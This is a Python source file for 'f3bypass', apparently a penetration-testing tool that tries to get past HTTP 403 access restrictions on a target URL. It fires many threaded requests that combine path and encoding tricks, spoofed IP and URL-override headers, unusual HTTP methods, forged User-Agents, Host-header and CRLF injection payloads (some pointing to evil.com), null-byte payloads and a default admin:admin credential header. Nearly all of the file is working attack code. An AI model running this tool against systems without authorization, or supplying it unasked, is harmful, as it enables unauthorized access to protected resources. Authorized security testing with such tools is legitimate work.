"""
███████╗██████╗ ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
██╔════╝╚════██╗██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
█████╗   █████╔╝██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
██╔══╝   ╚═══██╗██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
██║     ██████╔╝██████╔╝   ██║   ██║     ██║  ██║███████║███████║
╚═╝     ╚═════╝ ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
                    403 Bypass Testing Tool
                    By: Ali Shahsavar
                    Version: 1.0
"""

import argparse
import requests
import sys
import time
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ──────────────────────────────────────────────
# COLORS
# ──────────────────────────────────────────────
class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    BOLD   = "\033[1m"
    RESET  = "\033[0m"
    GRAY   = "\033[90m"

# ──────────────────────────────────────────────
# BANNER
# ──────────────────────────────────────────────
def banner():
    print(f"""
{C.CYAN}{C.BOLD}
███████╗██████╗ ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
██╔════╝╚════██╗██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
█████╗   █████╔╝██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
██╔══╝   ╚═══██╗██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
██║     ██████╔╝██████╔╝   ██║   ██║     ██║  ██║███████║███████║
╚═╝     ╚═════╝ ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
{C.RESET}
{C.YELLOW}              403 Bypass Testing Tool v2.0.0{C.RESET}
{C.GRAY}         For authorized security testing only!{C.RESET}
""")

# ──────────────────────────────────────────────
# TECHNIQUE BUILDERS
# ──────────────────────────────────────────────

def build_path_bypasses(url):
    """Generate all path manipulation variants."""
    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.netloc}"
    path   = parsed.path.rstrip("/") or "/"

    # Extract last segment for partial tricks
    parts  = path.split("/")
    last   = parts[-1] if parts[-1] else parts[-2] if len(parts) > 1 else path

    variants = []
    # Basic path tricks
    paths = [
        path,
        path + "/",
        path + "//",
        path + "?",
        path + "??",
        path + "#",
        path + "/*",
        path + ".json",
        path + ".html",
        path + ".php",
        path + ".asp",
        path + ".aspx",
        "//" + path.lstrip("/"),
        "/" + path.lstrip("/") + "/..",
        path + "/.",
        path + "/./",
        "/." + path,
        path.replace(last, last.upper()) if last else path,
        path.replace(last, last.capitalize()) if last else path,
        # URL encoding tricks
        path.replace("/", "%2f"),
        path.replace("/", "%2F"),
        path.replace("/", "%252f"),
        path.replace("/", "%252F"),
        path + "%20",
        path + "%09",
        path + "%00",
        # Unicode/overlong encoding
        path.replace("/", "%c0%af"),
        path.replace("/", "%e0%80%af"),
        path.replace("/", "..;/"),
        # Dot-segment tricks
        "/".join(parts[:-1]) + "/." + last if last else path,
        path + "/..;/",
        path + ";/",
        path + "..;",
        # Double slash tricks
        path.replace("/", "///"),
        "///" + path.lstrip("/"),
    ]

    for p in paths:
        variants.append({
            "url":       base + p,
            "technique": f"Path Bypass: {p}",
            "category":  "PATH",
        })
    return variants


def build_header_bypasses(url):
    """Generate all header injection variants."""
    parsed = urlparse(url)
    host   = parsed.netloc.split(":")[0]
    path   = parsed.path or "/"

    ip_values     = ["127.0.0.1", "localhost", "0.0.0.0", "::1", "0", "10.0.0.1", "192.168.1.1"]
    path_headers  = [
        "X-Original-URL",
        "X-Rewrite-URL",
        "X-Override-URL",
        "X-Forwarded-Path",
        "X-Custom-URL",
    ]
    ip_headers    = [
        "X-Forwarded-For",
        "X-Remote-IP",
        "X-Client-IP",
        "X-Real-IP",
        "X-Originating-IP",
        "X-Remote-Addr",
        "X-ProxyUser-IP",
        "CF-Connecting-IP",
        "True-Client-IP",
        "X-Cluster-Client-IP",
        "Forwarded",
        "X-Forwarded-Host",
        "X-Host",
        "X-Custom-IP-Authorization",
    ]
    misc_headers  = [
        {"X-Original-URL":      "/"},
        {"X-Forwarded-For":     "127.0.0.1", "X-Original-URL": path},
        {"X-HTTP-Method-Override": "PUT"},
        {"Content-Length":      "0"},
        {"X-WAF-Bypass":        "1"},
        {"X-Ignore-Rate-Limit": "1"},
        {"X-Rate-Limit-Bypass": "1"},
        {"Origin":              f"http://{host}"},
        {"Referer":             f"http://{host}/"},
        {"Authorization":       "Basic YWRtaW46YWRtaW4="},
        {"Authorization":       "Bearer null"},
    ]

    variants = []

    # IP header combinations
    for h in ip_headers:
        for ip in ip_values:
            variants.append({
                "url":       url,
                "headers":   {h: ip},
                "technique": f"IP Header: {h}: {ip}",
                "category":  "HEADER",
            })

    # Path override headers
    for h in path_headers:
        variants.append({
            "url":       url,
            "headers":   {h: path},
            "technique": f"Path Header: {h}: {path}",
            "category":  "HEADER",
        })
        variants.append({
            "url":       url,
            "headers":   {h: "/"},
            "technique": f"Path Header: {h}: /",
            "category":  "HEADER",
        })

    # Misc headers
    for h in misc_headers:
        variants.append({
            "url":       url,
            "headers":   h,
            "technique": f"Misc Header: {h}",
            "category":  "HEADER",
        })

    return variants


def build_method_bypasses(url):
    """Test all HTTP method variants."""
    methods = [
        "GET", "POST", "PUT", "PATCH", "DELETE",
        "HEAD", "OPTIONS", "TRACE", "CONNECT",
        "PROPFIND", "PROPPATCH", "MKCOL", "COPY",
        "MOVE", "LOCK", "UNLOCK", "ACL",
        "SEARCH", "REPORT", "VERSION-CONTROL",
        "CHECKIN", "CHECKOUT", "UNCHECKOUT",
        "MKWORKSPACE", "UPDATE", "LABEL",
        "MERGE", "BASELINE-CONTROL", "MKACTIVITY",
    ]
    variants = []
    for m in methods:
        variants.append({
            "url":       url,
            "method":    m,
            "technique": f"HTTP Method: {m}",
            "category":  "METHOD",
        })
    return variants


def build_protocol_bypasses(url):
    """Protocol and HTTP version tricks."""
    parsed    = urlparse(url)
    http_url  = url.replace("https://", "http://")
    https_url = url.replace("http://", "https://")

    variants = [
        {
            "url":       http_url,
            "technique": "Protocol: HTTP (downgrade)",
            "category":  "PROTOCOL",
        },
        {
            "url":       https_url,
            "technique": "Protocol: HTTPS (upgrade)",
            "category":  "PROTOCOL",
        },
        {
            "url":       url,
            "headers":   {"X-Forwarded-Proto": "https"},
            "technique": "Protocol Header: X-Forwarded-Proto: https",
            "category":  "PROTOCOL",
        },
        {
            "url":       url,
            "headers":   {"X-Forwarded-Proto": "http"},
            "technique": "Protocol Header: X-Forwarded-Proto: http",
            "category":  "PROTOCOL",
        },
    ]
    return variants


def build_useragent_bypasses(url):
    """User-Agent spoofing variants."""
    agents = [
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
        "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
        "curl/7.68.0",
        "python-requests/2.27.1",
        "PostmanRuntime/7.29.0",
        "Go-http-client/1.1",
        "aws-sdk-java/1.11",
        "internal-tool/1.0",
        "LB-HealthChecker/1.0",
        "HealthCheck/1.0",
        "localhost",
    ]
    variants = []
    for ua in agents:
        variants.append({
            "url":       url,
            "headers":   {"User-Agent": ua},
            "technique": f"User-Agent: {ua[:60]}",
            "category":  "USERAGENT",
        })
    return variants


def build_content_type_bypasses(url):
    """Content-Type tricks."""
    content_types = [
        "application/json",
        "application/xml",
        "application/x-www-form-urlencoded",
        "text/plain",
        "text/html",
        "multipart/form-data",
        "application/octet-stream",
    ]
    variants = []
    for ct in content_types:
        variants.append({
            "url":       url,
            "method":    "POST",
            "headers":   {"Content-Type": ct},
            "technique": f"Content-Type POST: {ct}",
            "category":  "CONTENT-TYPE",
        })
    return variants


def build_host_header_bypasses(url):
    """Host header manipulation."""
    parsed = urlparse(url)
    host   = parsed.netloc

    host_values = [
        "localhost",
        "127.0.0.1",
        "0.0.0.0",
        host + ".evil.com",
        "evil.com",
        host + ":80",
        host + ":443",
        host + ":8080",
    ]
    variants = []
    for h in host_values:
        variants.append({
            "url":       url,
            "headers":   {"Host": h},
            "technique": f"Host Header: {h}",
            "category":  "HOST",
        })
    return variants


def build_crlf_bypasses(url):
    """CRLF injection in path."""
    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.netloc}"
    path   = parsed.path or "/"

    crlf_payloads = [
        path + "%0d%0a",
        path + "%0d%0aX-Injected:true",
        path + "%0d%0a%0d%0a",
        path + "%0a",
        path + "%0aX-Custom:injected",
        path + "\r\n",
        path + "%E5%98%8A%E5%98%8D",        # Unicode CRLF
        path + "%E5%98%8A%E5%98%8DX-Test:1",
        path + "%23%0d%0a",                  # #\r\n
        path + "/%0d%0aLocation:http://evil.com",
    ]
    variants = []
    for p in crlf_payloads:
        variants.append({
            "url":       base + p,
            "technique": f"CRLF Injection: {p}",
            "category":  "CRLF",
        })
    return variants


def build_null_byte_bypasses(url):
    """Null byte and special character injection."""
    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.netloc}"
    path   = parsed.path or "/"

    payloads = [
        path + "%00",
        path + "%00.html",
        path + "%00.php",
        path + "%00.jpg",
        path + "%00.txt",
        path + "%00/",
        path + "\x00",
        path + "%00index.html",
        path + ".%00.",
        path + "/%00../",
        path + "%01",
        path + "%07",
    ]
    variants = []
    for p in payloads:
        variants.append({
            "url":       base + p,
            "technique": f"Null Byte: {p}",
            "category":  "NULLBYTE",
        })
    return variants






def build_ipv6_bypasses(url):
    """IPv6 address variants in IP-based headers."""
    ipv6_values = [
        "::1",
        "::ffff:127.0.0.1",
        "0:0:0:0:0:0:0:1",
        "::ffff:0:0",
        "64:ff9b::1",
        "2001:db8::1",
        "fe80::1",
        "0000:0000:0000:0000:0000:0000:0000:0001",
    ]
    ip_headers = [
        "X-Forwarded-For",
        "X-Real-IP",
        "X-Client-IP",
        "X-Originating-IP",
        "CF-Connecting-IP",
    ]
    variants = []
    for h in ip_headers:
        for ip in ipv6_values:
            variants.append({
                "url":       url,
                "headers":   {h: ip},
                "technique": f"IPv6 Header: {h}: {ip}",
                "category":  "IPV6",
            })
    return variants



# ──────────────────────────────────────────────
# REQUEST SENDER
# ──────────────────────────────────────────────

def send_request(variant, timeout=10, delay=0):
    """Execute a single bypass attempt and return result."""
    if delay:
        time.sleep(delay)

    url       = variant.get("url", "")
    method    = variant.get("method", "GET")
    headers   = variant.get("headers", {})
    body      = variant.get("body", None)
    technique = variant.get("technique", "")
    category  = variant.get("category", "")

    try:
        resp = requests.request(
            method,
            url,
            headers=headers,
            data=body,
            timeout=timeout,
            verify=False,
            allow_redirects=True,
        )
        return {
            "status":    resp.status_code,
            "length":    len(resp.content),
            "url":       url,
            "technique": technique,
            "category":  category,
            "headers":   headers,
            "method":    method,
        }
    except requests.exceptions.ConnectionError:
        return {"status": "ERR", "technique": technique, "url": url, "category": category, "error": "Connection Error"}
    except requests.exceptions.Timeout:
        return {"status": "TIM", "technique": technique, "url": url, "category": category, "error": "Timeout"}
    except Exception as e:
        return {"status": "ERR", "technique": technique, "url": url, "category": category, "error": str(e)}


# ──────────────────────────────────────────────
# OUTPUT
# ──────────────────────────────────────────────

def status_color(code):
    if code == 200:
        return C.GREEN + C.BOLD
    elif code in (201, 202, 204):
        return C.GREEN
    elif str(code).startswith("3"):
        return C.YELLOW
    elif code == 403:
        return C.RED
    elif str(code).startswith("4"):
        return C.YELLOW
    elif str(code).startswith("5"):
        return C.GRAY
    else:
        return C.CYAN


def print_result(r, show_all=False, baseline=None):
    code = r.get("status")
    if isinstance(code, int):
        if not show_all and code == 403:
            return  # skip expected 403s unless show_all
        if baseline and code == baseline:
            return  # skip same-as-baseline unless show_all

        color = status_color(code)
        length = r.get("length", 0)
        tag = ""
        if code == 200:
            tag = f" {C.GREEN}<<< POSSIBLE BYPASS!{C.RESET}"
        elif code in (201, 202, 204):
            tag = f" {C.GREEN}<<< CHECK THIS{C.RESET}"

        print(
            f"  {color}[{code}]{C.RESET} "
            f"{C.GRAY}[{r['category']:<12}]{C.RESET} "
            f"{C.CYAN}{r['technique']:<70}{C.RESET} "
            f"{C.GRAY}({length} bytes){C.RESET}{tag}"
        )
    else:
        if show_all:
            print(f"  {C.GRAY}[{code}] [{r['category']:<12}] {r['technique']} — {r.get('error','')}{C.RESET}")


def print_summary(results, elapsed):
    total   = len(results)
    success = [r for r in results if r.get("status") == 200]
    partial = [r for r in results if isinstance(r.get("status"), int) and r["status"] in (201, 202, 204)]
    errors  = [r for r in results if not isinstance(r.get("status"), int)]
    redirect= [r for r in results if isinstance(r.get("status"), int) and str(r["status"]).startswith("3")]

    print(f"\n{C.BOLD}{'─'*70}{C.RESET}")
    print(f"{C.BOLD}  SUMMARY{C.RESET}")
    print(f"{'─'*70}")
    print(f"  Total Attempts : {total}")
    print(f"  Elapsed Time   : {elapsed:.2f}s")
    print(f"  {C.GREEN}200 Responses  : {len(success)}{C.RESET}")
    print(f"  {C.GREEN}2xx Other      : {len(partial)}{C.RESET}")
    print(f"  {C.YELLOW}Redirects (3xx): {len(redirect)}{C.RESET}")
    print(f"  {C.GRAY}Errors/Timeouts: {len(errors)}{C.RESET}")

    if success:
        print(f"\n{C.GREEN}{C.BOLD}  ✓ POTENTIAL BYPASSES FOUND:{C.RESET}")
        for r in success:
            print(f"    → [{r['category']}] {r['technique']}")
            print(f"      URL: {r['url']}")
            if r.get("headers"):
                print(f"      Headers: {r['headers']}")

    print(f"{'─'*70}\n")


# ──────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────

def main():
    banner()

    parser = argparse.ArgumentParser(
        description="f3bypass — 403 Status Code Bypass Testing Tool",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument("url",                  help="Target URL (e.g. https://example.com/admin)")
    parser.add_argument("-t", "--threads",      type=int,   default=10,    help="Number of threads (default: 10)")
    parser.add_argument("-T", "--timeout",      type=int,   default=10,    help="Request timeout seconds (default: 10)")
    parser.add_argument("-d", "--delay",        type=float, default=0,     help="Delay between requests in seconds (default: 0)")
    parser.add_argument("-a", "--all",          action="store_true",       help="Show all responses (including 403s)")
    parser.add_argument("-o", "--output",       type=str,   default=None,  help="Save results to file")
    parser.add_argument("--skip-path",          action="store_true",       help="Skip path manipulation tests")
    parser.add_argument("--skip-headers",       action="store_true",       help="Skip header injection tests")
    parser.add_argument("--skip-methods",       action="store_true",       help="Skip HTTP method tests")
    parser.add_argument("--skip-protocol",      action="store_true",       help="Skip protocol tests")
    parser.add_argument("--skip-useragent",     action="store_true",       help="Skip User-Agent tests")
    parser.add_argument("--skip-content-type",  action="store_true",       help="Skip Content-Type tests")
    parser.add_argument("--skip-host",          action="store_true",       help="Skip Host header tests")
    parser.add_argument("--skip-crlf",          action="store_true",       help="Skip CRLF injection tests")
    parser.add_argument("--skip-nullbyte",      action="store_true",       help="Skip null byte injection tests")
    parser.add_argument("--skip-ipv6",          action="store_true",       help="Skip IPv6 header tests")

    args = parser.parse_args()

    # ── Validate URL ──
    parsed = urlparse(args.url)
    if not parsed.scheme or not parsed.netloc:
        print(f"{C.RED}[!] Invalid URL. Use full URL with scheme: https://example.com/path{C.RESET}")
        sys.exit(1)

    print(f"{C.BOLD}  Target : {C.CYAN}{args.url}{C.RESET}")
    print(f"{C.BOLD}  Threads: {args.threads}   Timeout: {args.timeout}s   Delay: {args.delay}s{C.RESET}\n")

    # ── Baseline check ──
    print(f"{C.YELLOW}[*] Running baseline request...{C.RESET}")
    baseline_result = send_request({"url": args.url, "technique": "baseline", "category": "BASELINE"}, timeout=args.timeout)
    baseline_code   = baseline_result.get("status")
    print(f"    Baseline status: {status_color(baseline_code) if isinstance(baseline_code, int) else C.GRAY}"
          f"[{baseline_code}]{C.RESET}\n")

    # ── Build all variants ──
    all_variants = []
    if not args.skip_path:         all_variants += build_path_bypasses(args.url)
    if not args.skip_headers:      all_variants += build_header_bypasses(args.url)
    if not args.skip_methods:      all_variants += build_method_bypasses(args.url)
    if not args.skip_protocol:     all_variants += build_protocol_bypasses(args.url)
    if not args.skip_useragent:    all_variants += build_useragent_bypasses(args.url)
    if not args.skip_content_type: all_variants += build_content_type_bypasses(args.url)
    if not args.skip_host:         all_variants += build_host_header_bypasses(args.url)
    if not args.skip_crlf:         all_variants += build_crlf_bypasses(args.url)
    if not args.skip_nullbyte:     all_variants += build_null_byte_bypasses(args.url)
    if not args.skip_ipv6:         all_variants += build_ipv6_bypasses(args.url)

    print(f"{C.YELLOW}[*] Total techniques to test: {C.BOLD}{len(all_variants)}{C.RESET}\n")
    print(f"{'─'*70}")

    # ── Run tests ──
    results  = []
    start    = time.time()
    category = None

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {
            executor.submit(send_request, v, args.timeout, args.delay): v
            for v in all_variants
        }
        for future in as_completed(futures):
            r = future.result()
            results.append(r)

            # Print category header on first occurrence
            if r.get("category") != category:
                category = r.get("category")
                print(f"\n{C.BLUE}{C.BOLD}  [{category}]{C.RESET}")

            print_result(r, show_all=args.all, baseline=baseline_code)

    elapsed = time.time() - start
    print_summary(results, elapsed)

    # ── Save output ──
    if args.output:
        with open(args.output, "w") as f:
            f.write(f"f3bypass Results — {args.url}\n{'='*60}\n\n")
            for r in results:
                code = r.get("status")
                if isinstance(code, int):
                    f.write(f"[{code}] [{r['category']}] {r['technique']} | URL: {r['url']}\n")
                    if r.get("headers"):
                        f.write(f"       Headers: {r['headers']}\n")
        print(f"{C.GREEN}[✓] Results saved to {args.output}{C.RESET}\n")


if __name__ == "__main__":
    main()
